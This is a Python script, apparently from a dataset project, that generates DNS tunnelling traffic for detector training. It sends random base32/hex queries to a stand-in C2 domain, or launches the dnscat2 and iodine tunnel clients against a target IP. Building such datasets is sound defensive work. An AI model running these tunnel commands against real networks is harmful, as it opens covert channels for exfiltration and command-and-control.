"""
dataset/generators/dns_tunnel_gen.py
=====================================
DNS tunnelling traffic generator using dnscat2 and iodine.

Also includes a pure-Python fallback that crafts high-entropy DNS queries
directly using dnspython (useful when dnscat2/iodine aren't installed).

Usage:
  python dns_tunnel_gen.py --tool python --target 192.168.1.10 --duration 60
"""
import argparse
import base64
import os
import random
import socket
import string
import subprocess
import sys
import time


# ── Pure-Python DNS tunnel simulator ─────────────────────────────────────────
# Generates high-entropy query names typical of DNS tunnelling.

BASE32_ALPHABET = string.ascii_lowercase + "234567"
TUNNEL_DOMAIN   = "tunnel.c2.example.com"


def _random_base32_label(length: int) -> str:
    return "".join(random.choices(BASE32_ALPHABET, k=length))


def _make_tunnel_query() -> str:
    """Generate a query name that looks like base32-encoded tunnel data."""
    # Typical iodine-style: <32-char base32 chunk>.<subdomain>.<c2domain>
    chunk = _random_base32_label(random.randint(24, 40))
    return f"{chunk}.{TUNNEL_DOMAIN}"


def _make_dnscat2_query() -> str:
    """Generate a query name resembling dnscat2 encoding."""
    # dnscat2 uses hex encoding of session data
    hex_data  = "".join(random.choices("0123456789abcdef", k=random.randint(20, 50)))
    session   = random.randint(1000, 9999)
    return f"{hex_data}.{session}.{TUNNEL_DOMAIN}"


def python_tunnel_sim(duration: int, query_interval: float):
    """Pure Python DNS tunnel simulator. No external tools needed."""
    print(f"[dns_tunnel] Mode     : python (no external tool)")
    print(f"[dns_tunnel] Domain   : {TUNNEL_DOMAIN}")
    print(f"[dns_tunnel] Duration : {duration}s")

    start = time.time()
    count = 0

    while time.time() - start < duration:
        query = _make_dnscat2_query() if random.random() > 0.5 else _make_tunnel_query()
        try:
            # TXT record type would be more realistic but getaddrinfo is simpler
            socket.getaddrinfo(query, None)
        except (socket.gaierror, OSError):
            pass   # NXDOMAIN expected
        count += 1
        print(f"[dns_tunnel] Query #{count}: {query}")
        time.sleep(query_interval)

    print(f"[dns_tunnel] Done — {count} queries in {time.time()-start:.0f}s")


def dnscat2_sim(target: str, duration: int):
    """Run dnscat2 client against a target."""
    print(f"[dns_tunnel] Tool     : dnscat2")
    print(f"[dns_tunnel] Target   : {target}")
    try:
        proc = subprocess.Popen(
            ["dnscat2", "--dns", f"server={target},port=53", "--no-cache"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        time.sleep(duration)
        proc.terminate()
    except FileNotFoundError:
        print("[dns_tunnel] dnscat2 not found — falling back to python simulator")
        python_tunnel_sim(duration, query_interval=0.5)


def iodine_sim(target: str, duration: int):
    """Run iodine client."""
    print(f"[dns_tunnel] Tool     : iodine")
    try:
        proc = subprocess.Popen(
            ["iodine", "-f", target, TUNNEL_DOMAIN],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        time.sleep(duration)
        proc.terminate()
    except FileNotFoundError:
        print("[dns_tunnel] iodine not found — falling back to python simulator")
        python_tunnel_sim(duration, query_interval=0.5)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DNS tunnel generator for SIH26145 dataset")
    parser.add_argument("--tool",     default="python",
                        choices=["python", "dnscat2", "iodine"], help="Tool to use")
    parser.add_argument("--target",   default="127.0.0.1", help="Target IP (for dnscat2/iodine)")
    parser.add_argument("--duration", type=int, default=60,   help="Duration in seconds")
    parser.add_argument("--interval", type=float, default=0.3, help="Seconds between queries (python mode)")
    args = parser.parse_args()

    try:
        if args.tool == "python":
            python_tunnel_sim(args.duration, args.interval)
        elif args.tool == "dnscat2":
            dnscat2_sim(args.target, args.duration)
        elif args.tool == "iodine":
            iodine_sim(args.target, args.duration)
    except KeyboardInterrupt:
        print("\n[dns_tunnel] Stopped by user.")
